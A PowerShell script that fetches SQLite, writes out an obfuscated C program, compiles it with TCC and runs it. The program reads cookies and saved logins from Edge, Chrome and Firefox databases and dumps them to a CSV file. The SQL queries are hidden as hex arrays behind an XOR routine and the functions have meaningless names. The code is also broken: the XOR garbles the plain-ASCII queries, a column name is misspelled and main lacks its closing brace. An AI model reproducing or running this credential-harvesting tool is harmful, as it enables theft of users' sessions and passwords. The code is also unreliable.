# Define the URL for the SQLite amalgamation ZIP file
$headerUrl = "https://www.sqlite.org/2024/sqlite-amalgamation-3470000.zip"
$headerZipPath = "$env:TEMP\sqlite-amalgamation.zip"
$tccIncludePath = "C:\Program Files (x86)\tcc-0.9.27\include"

# Download the SQLite amalgamation ZIP file
Write-Output "Downloading SQLite amalgamation..."
Invoke-WebRequest -Uri $headerUrl -OutFile $headerZipPath

# Extract the SQLite amalgamation ZIP file
Write-Output "Extracting SQLite amalgamation..."
Expand-Archive -Path $headerZipPath -DestinationPath $env:TEMP -Force

# Copy sqlite3.h to TCC include directory
Write-Output "Copying sqlite3.h to TCC include directory..."
Copy-Item -Path "$env:TEMP\sqlite-amalgamation-3470000\sqlite3.h" -Destination $tccIncludePath

# Clean up SQLite amalgamation ZIP file
Remove-Item -Path $headerZipPath

# Define the C code
$cCode = @'
#include <stdio.h>
#include <sqlite3.h>
#include <stdlib.h>
#include <string.h>

void decrypt(char *str) {
    while (*str) {
        *str = *str ^ 0xAA; // Simple XOR decryption
        str++;
    }
}

void write_to_csv(FILE *file, const char *type, const char *col1, const char *col2, const char *col3) {
    fprintf(file, "%s,%s,%s,%s\n", type, col1, col2, col3);
}

void a(sqlite3 *b, FILE *file) {
    sqlite3_stmt *c;
    char d[] = {0x53, 0x45, 0x4c, 0x45, 0x43, 0x54, 0x20, 0x68, 0x6f, 0x73, 0x74, 0x5f, 0x6b, 0x65, 0x2c, 0x20, 0x6e, 0x61, 0x6d, 0x65, 0x2c, 0x20, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x20, 0x46, 0x52, 0x4f, 0x4d, 0x20, 0x63, 0x6f, 0x6f, 0x6b, 0x69, 0x65, 0x73, 0x00};
    decrypt(d);
    int e = sqlite3_prepare_v2(b, d, -1, &c, 0);

    if (e != SQLITE_OK) {
        fprintf(stderr, "Failed to fetch cookies: %s\n", sqlite3_errmsg(b));
        return;
    }

    while (sqlite3_step(c) == SQLITE_ROW) {
        write_to_csv(file, "Cookie",
                     (const char *)sqlite3_column_text(c, 0),
                     (const char *)sqlite3_column_text(c, 1),
                     (const char *)sqlite3_column_text(c, 2));
    }

    sqlite3_finalize(c);
}

void f(sqlite3 *b, FILE *file) {
    sqlite3_stmt *c;
    char d[] = {0x53, 0x45, 0x4c, 0x45, 0x43, 0x54, 0x20, 0x6f, 0x72, 0x69, 0x67, 0x69, 0x6e, 0x5f, 0x75, 0x72, 0x6c, 0x2c, 0x20, 0x75, 0x73, 0x65, 0x72, 0x6e, 0x61, 0x6d, 0x65, 0x5f, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x2c, 0x20, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x5f, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x20, 0x46, 0x52, 0x4f, 0x4d, 0x20, 0x6c, 0x6f, 0x67, 0x69, 0x6e, 0x73, 0x00};
    decrypt(d);
    int e = sqlite3_prepare_v2(b, d, -1, &c, 0);

    if (e != SQLITE_OK) {
        fprintf(stderr, "Failed to fetch passwords: %s\n", sqlite3_errmsg(b));
        return;
    }

    while (sqlite3_step(c) == SQLITE_ROW) {
        write_to_csv(file, "Password",
                     (const char *)sqlite3_column_text(c, 0),
                     (const char *)sqlite3_column_text(c, 1),
                     (const char *)sqlite3_column_text(c, 2));
    }

    sqlite3_finalize(c);
}

void g(const char *h, void (*i)(sqlite3 *, FILE *), FILE *file) {
    sqlite3 *b;
    int e = sqlite3_open(h, &b);

    if (e != SQLITE_OK) {
        fprintf(stderr, "Cannot open database %s: %s\n", h, sqlite3_errmsg(b));
        return;
    }

    i(b, file);
    sqlite3_close(b);
}

int main() {
    const char *j = "EdgeCookies.db";
    const char *k = "EdgePasswords.db";
    const char *l = "ChromeCookies.db";
    const char *m = "ChromePasswords.db";
    const char *n = "FirefoxCookies.sqlite";
    const char *o = "FirefoxLogins.sqlite";

    FILE *file = fopen("output.csv", "w");
    if (!file) {
        fprintf(stderr, "Cannot open output.csv for writing\n");
        return 1;
    }

    fprintf(file, "Type,Column1,Column2,Column3\n");

    printf("Reading Edge cookies and passwords...\n");
    g(j, a, file);
    g(k, f, file);

    printf("Reading Chrome cookies and passwords...\n");
    g(l, a, file);
    g(m, f, file);

    printf("Reading Firefox cookies and passwords...\n");
    g(n, a, file);
    g(o, f, file);

    fclose(file);

    return 0;
'@

# Write the C code to a file
$cFilePath = "$env:TEMP\read_browser_data.c"
Set-Content -Path $cFilePath -Value $cCode

# Compile the C code using TCC
Write-Output "Compiling the C code..."
tcc -o "$env:TEMP\read_browser_data.exe" $cFilePath

Write-Output "Compilation completed successfully!"

# Execute the compiled executable
Write-Output "Executing the compiled program..."
& "$env:TEMP\read_browser_data.exe"

Write-Output "Execution completed. Check output.csv for results."
